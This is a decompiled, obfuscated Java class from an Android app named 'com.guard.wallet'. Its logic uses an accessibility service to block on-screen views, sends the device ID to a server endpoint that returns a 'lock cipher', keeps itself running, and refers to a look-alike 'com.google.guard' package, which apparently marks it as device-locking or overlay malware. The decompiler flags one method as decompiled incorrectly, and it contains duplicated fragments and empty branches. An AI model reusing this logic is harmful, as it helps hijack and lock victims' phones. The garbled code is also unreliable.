package com.guard.wallet.thread;

import a1.AbstractC0026q;
import b0.C0078b;
import com.guard.wallet.helper.AbstractC0184g;
import com.guard.wallet.http.AbstractC0207l;
import com.guard.wallet.http.C0203h;
import com.guard.wallet.http.C0204i;
import com.guard.wallet.http.C0219x;
import com.guard.wallet.req.BlockViewVO;
import com.guard.wallet.req.ReqDefaultBodyVO;
import com.guard.wallet.resp.PowerControlStateVO;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.utils.AbstractC0249e;
import com.guard.wallet.utils.AbstractC0251g;
import com.guard.wallet.utils.AbstractC0252h;
import f0.AbstractC0296q;
import f0.C0291l;
import f0.C0292m;
import f0.C0299t;
import f0.InterfaceC0294o;
import f0.InterfaceC0298s;
import g0.InterfaceC0309a;
import g0.InterfaceC0310b;
import h0.C0323e;
import h0.FutureC0326h;
import h0.InterfaceC0320b;
import i0.C0330a;
import i0.C0334e;
import j0.C0352b;
import j0.C0353c;
import j0.InterfaceC0351a;
import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.util.Iterator;
import java.util.Timer;
import java.util.concurrent.ConcurrentLinkedQueue;
import l0.C0377g;
import org.json.JSONObject;
import p0.f0;
import p0.j0;
import p002e.C0262b;
import p005h.C0318e;
import p019w.AbstractC0956a;

/* renamed from: com.guard.wallet.thread.j */
/* loaded from: classes.dex */
public final class C0241j implements InterfaceC0320b, InterfaceC0351a, InterfaceC0298s, InterfaceC0310b {

    /* renamed from: g */
    public static volatile C0241j f385g;

    /* renamed from: d */
    public final /* synthetic */ int f386d;

    /* renamed from: e */
    public Object f387e;

    /* renamed from: f */
    public Object f388f;

    public C0241j() {
        this.f386d = 0;
        this.f387e = new ConcurrentLinkedQueue();
        this.f388f = new Timer();
        ((Timer) this.f388f).schedule(new C0235d(this, 1), 500L, 500L);
    }

    /* renamed from: e */
    public static boolean m585e() {
        try {
            if (C0318e.m844S().m860U() || AbstractC0251g.p0() || AbstractC0251g.n0()) {
                return false;
            }
            return AbstractC0251g.Q0();
        } catch (Exception e2) {
            AbstractC0026q.m186s("StrategyThread", e2);
            return false;
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:46:0x008f A[Catch: Exception -> 0x012b, TryCatch #0 {Exception -> 0x012b, blocks: (B:3:0x0003, B:5:0x0009, B:7:0x0018, B:9:0x001e, B:12:0x002b, B:14:0x0031, B:16:0x0037, B:18:0x0041, B:20:0x0048, B:23:0x0055, B:32:0x0067, B:35:0x0072, B:38:0x0079, B:40:0x007f, B:44:0x0089, B:46:0x008f, B:48:0x009d, B:49:0x00b1, B:51:0x00b7, B:55:0x00c0, B:57:0x00c4, B:59:0x00ca, B:60:0x00cd, B:62:0x00d3, B:63:0x00e1, B:65:0x00eb, B:67:0x00ef, B:69:0x00f8, B:71:0x00fe, B:73:0x0104, B:75:0x0108, B:76:0x010c, B:78:0x0113, B:80:0x0123), top: B:2:0x0003 }] */
    /* JADX WARN: Removed duplicated region for block: B:62:0x00d3 A[Catch: Exception -> 0x012b, TryCatch #0 {Exception -> 0x012b, blocks: (B:3:0x0003, B:5:0x0009, B:7:0x0018, B:9:0x001e, B:12:0x002b, B:14:0x0031, B:16:0x0037, B:18:0x0041, B:20:0x0048, B:23:0x0055, B:32:0x0067, B:35:0x0072, B:38:0x0079, B:40:0x007f, B:44:0x0089, B:46:0x008f, B:48:0x009d, B:49:0x00b1, B:51:0x00b7, B:55:0x00c0, B:57:0x00c4, B:59:0x00ca, B:60:0x00cd, B:62:0x00d3, B:63:0x00e1, B:65:0x00eb, B:67:0x00ef, B:69:0x00f8, B:71:0x00fe, B:73:0x0104, B:75:0x0108, B:76:0x010c, B:78:0x0113, B:80:0x0123), top: B:2:0x0003 }] */
    /* JADX WARN: Removed duplicated region for block: B:65:0x00eb A[Catch: Exception -> 0x012b, TryCatch #0 {Exception -> 0x012b, blocks: (B:3:0x0003, B:5:0x0009, B:7:0x0018, B:9:0x001e, B:12:0x002b, B:14:0x0031, B:16:0x0037, B:18:0x0041, B:20:0x0048, B:23:0x0055, B:32:0x0067, B:35:0x0072, B:38:0x0079, B:40:0x007f, B:44:0x0089, B:46:0x008f, B:48:0x009d, B:49:0x00b1, B:51:0x00b7, B:55:0x00c0, B:57:0x00c4, B:59:0x00ca, B:60:0x00cd, B:62:0x00d3, B:63:0x00e1, B:65:0x00eb, B:67:0x00ef, B:69:0x00f8, B:71:0x00fe, B:73:0x0104, B:75:0x0108, B:76:0x010c, B:78:0x0113, B:80:0x0123), top: B:2:0x0003 }] */
    /* JADX WARN: Removed duplicated region for block: B:67:0x00ef A[Catch: Exception -> 0x012b, TryCatch #0 {Exception -> 0x012b, blocks: (B:3:0x0003, B:5:0x0009, B:7:0x0018, B:9:0x001e, B:12:0x002b, B:14:0x0031, B:16:0x0037, B:18:0x0041, B:20:0x0048, B:23:0x0055, B:32:0x0067, B:35:0x0072, B:38:0x0079, B:40:0x007f, B:44:0x0089, B:46:0x008f, B:48:0x009d, B:49:0x00b1, B:51:0x00b7, B:55:0x00c0, B:57:0x00c4, B:59:0x00ca, B:60:0x00cd, B:62:0x00d3, B:63:0x00e1, B:65:0x00eb, B:67:0x00ef, B:69:0x00f8, B:71:0x00fe, B:73:0x0104, B:75:0x0108, B:76:0x010c, B:78:0x0113, B:80:0x0123), top: B:2:0x0003 }] */
    /* renamed from: g */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static boolean m586g(BlockViewVO blockViewVO, boolean z2) {
        boolean z3;
        PowerControlStateVO m707k;
        PowerControlStateVO m707k2;
        try {
            if (MyAccessibilityService.m554P() != null) {
                String packageName = MyAccessibilityService.m554P().getPackageName();
                boolean z4 = (AbstractC0026q.m151B(packageName) || (m707k2 = AbstractC0252h.m707k(packageName)) == null || !m707k2.getAllowAllFullBackground().booleanValue()) ? false : true;
                boolean z5 = (AbstractC0026q.m151B("com.google.guard") || (m707k = AbstractC0252h.m707k("com.google.guard")) == null || (!m707k.getAllowAllFullBackground().booleanValue() && m707k.getRetryCount() < 3 && !m707k.getAllowAutoStart().booleanValue())) ? false : true;
                boolean z6 = AbstractC0251g.d0("com.google.guard") != null;
                if ((z2 && z4 && (z5 || !z6)) || MyAccessibilityService.m554P().m529j() || AbstractC0956a.m1443a()) {
                    return false;
                }
                if (!AbstractC0252h.m710n() && !AbstractC0252h.m711o()) {
                    z3 = false;
                    if (!AbstractC0252h.m711o()) {
                        String str = AbstractC0207l.f252a;
                        String m708l = AbstractC0252h.m708l("deviceId");
                        if (!AbstractC0026q.m151B(m708l)) {
                            new C0204i().m405d(new ReqDefaultBodyVO(m708l), "/api/cipher/getLockCipher", new C0219x());
                        }
                    }
                    if (!AbstractC0251g.p0() && AbstractC0251g.r0() && !z3) {
                        return false;
                    }
                    if (C0262b.f433a != null && AbstractC0249e.m623l()) {
                        C0262b.m739e();
                    }
                    if (AbstractC0249e.m621j()) {
                        MyAccessibilityService.m554P().getClass();
                        blockViewVO.setBlockDrawable(MyAccessibilityService.o0());
                    }
                    AbstractC0184g.m347a(blockViewVO);
                    if (AbstractC0251g.p1(null)) {
                        AbstractC0184g.m349c();
                        return false;
                    }
                    AbstractC0026q.m172b();
                    if (!AbstractC0026q.m150A()) {
                        if (AbstractC0026q.m156G() && !AbstractC0026q.m164O(null, null)) {
                            AbstractC0184g.m349c();
                            return false;
                        }
                        AbstractC0251g.T0(2);
                    }
                    AbstractC0207l.m437t("KEEP_ALIVE_RUNNING_EVENT");
                    if (z4) {
                        MyAccessibilityService.m554P().m521b("com.google.guard");
                    } else {
                        MyAccessibilityService.m554P().m521b(MyAccessibilityService.m554P().getPackageName());
                    }
                    return true;
                }
                z3 = true;
                if (!AbstractC0252h.m711o()) {
                }
                if (!AbstractC0251g.p0()) {
                }
                if (C0262b.f433a != null) {
                    C0262b.m739e();
                }
                if (AbstractC0249e.m621j()) {
                }
                AbstractC0184g.m347a(blockViewVO);
                if (AbstractC0251g.p1(null)) {
                }
            }
        } catch (Exception e2) {
            AbstractC0026q.m186s("StrategyThread", e2);
        }
        return false;
    }

    @Override // h0.InterfaceC0320b
    /* renamed from: a */
    public final void mo587a(Exception exc, Object obj) {
        switch (this.f386d) {
            case 1:
                ((C0241j) this.f388f).f388f = (JSONObject) obj;
                ((InterfaceC0309a) this.f387e).mo293a(exc);
                break;
            default:
                ((C0241j) this.f388f).f388f = (String) obj;
                ((InterfaceC0309a) this.f387e).mo293a(exc);
                break;
        }
    }

    @Override // g0.InterfaceC0310b
    /* renamed from: b */
    public final void mo294b(InterfaceC0294o interfaceC0294o, C0292m c0292m) {
        switch (this.f386d) {
            case 6:
                c0292m.m805c((C0292m) this.f387e);
                break;
            default:
                c0292m.m805c((C0292m) this.f387e);
                break;
        }
    }

    @Override // f0.InterfaceC0298s
    /* renamed from: c */
    public final void mo588c(String str) {
        if (!"\r".equals(str)) {
            ((C0203h) this.f387e).m393g(str);
            return;
        }
        ((C0352b) this.f388f).m887l();
        C0352b c0352b = (C0352b) this.f388f;
        c0352b.getClass();
        c0352b.f545f = null;
        C0353c c0353c = new C0353c((C0203h) this.f387e);
        ((C0352b) this.f388f).getClass();
        C0352b c0352b2 = (C0352b) this.f388f;
        if (c0352b2.f545f == null) {
            c0352b2.f694m = c0353c;
            c0352b2.f693l = new C0292m();
            ((C0352b) this.f388f).f545f = new C0203h(this, 5);
        }
    }

    @Override // j0.InterfaceC0351a
    /* renamed from: d */
    public final void mo589d(AbstractC0296q abstractC0296q, C0377g c0377g) {
        switch (this.f386d) {
            case 2:
                new C0078b(28).m297f(abstractC0296q).m870f(null, new C0291l(new C0241j(this, c0377g, 1)));
                return;
            case 5:
                C0203h c0203h = new C0203h(7, 0);
                String mo782g = abstractC0296q.mo782g();
                FutureC0326h m297f = new C0078b(27).m297f(abstractC0296q);
                C0291l c0291l = new C0291l(new C0323e(c0203h, mo782g));
                FutureC0326h futureC0326h = new FutureC0326h();
                synchronized (futureC0326h) {
                    if (!futureC0326h.f629a) {
                        futureC0326h.f631c = m297f;
                    }
                }
                m297f.m870f(null, new C0323e(futureC0326h, c0291l));
                futureC0326h.m870f(null, new C0291l(new C0241j(this, c0377g, 4)));
                return;
            default:
                C0292m c0292m = new C0292m();
                abstractC0296q.mo783h(new C0241j(this, c0292m, 6));
                abstractC0296q.f544e = new C0299t(this, c0292m, c0377g);
                return;
        }
    }

    @Override // j0.InterfaceC0351a
    /* renamed from: f */
    public final boolean mo590f() {
        return true;
    }

    @Override // j0.InterfaceC0351a
    public final Object get() {
        switch (this.f386d) {
            case 2:
                return (JSONObject) this.f388f;
            case 5:
                return toString();
            default:
                return (C0334e) this.f387e;
        }
    }

    @Override // j0.InterfaceC0351a
    public final int length() {
        switch (this.f386d) {
            case 2:
                byte[] bytes = ((JSONObject) this.f388f).toString().getBytes();
                this.f387e = bytes;
                return bytes.length;
            case 5:
                if (((byte[]) this.f387e) == null) {
                    this.f387e = ((String) this.f388f).getBytes();
                }
                return ((byte[]) this.f387e).length;
            default:
                if (((byte[]) this.f388f) == null) {
                    StringBuilder sb = new StringBuilder();
                    try {
                        Iterator it = ((C0334e) this.f387e).iterator();
                        boolean z2 = true;
                        while (it.hasNext()) {
                            C0330a c0330a = (C0330a) it.next();
                            if (c0330a.f646b != null) {
                                if (!z2) {
                                    sb.append('&');
                                }
                                sb.append(URLEncoder.encode(c0330a.f645a, "UTF-8"));
                                sb.append('=');
                                sb.append(URLEncoder.encode(c0330a.f646b, "UTF-8"));
                                z2 = false;
                            }
                        }
                        this.f388f = sb.toString().getBytes("UTF-8");
                    } catch (UnsupportedEncodingException e2) {
                        throw new AssertionError(e2);
                    }
                }
                return ((byte[]) this.f388f).length;
        }
    }

    public final String toString() {
        switch (this.f386d) {
            case 5:
                return (String) this.f388f;
            default:
                return super.toString();
        }
    }

    public /* synthetic */ C0241j(int i2) {
        this.f386d = i2;
    }

    public /* synthetic */ C0241j(Object obj, Object obj2, int i2) {
        this.f386d = i2;
        this.f388f = obj;
        this.f387e = obj2;
    }

    public C0241j(f0 f0Var, j0 j0Var) {
        this.f386d = 9;
        this.f387e = f0Var;
        this.f388f = j0Var;
    }
}
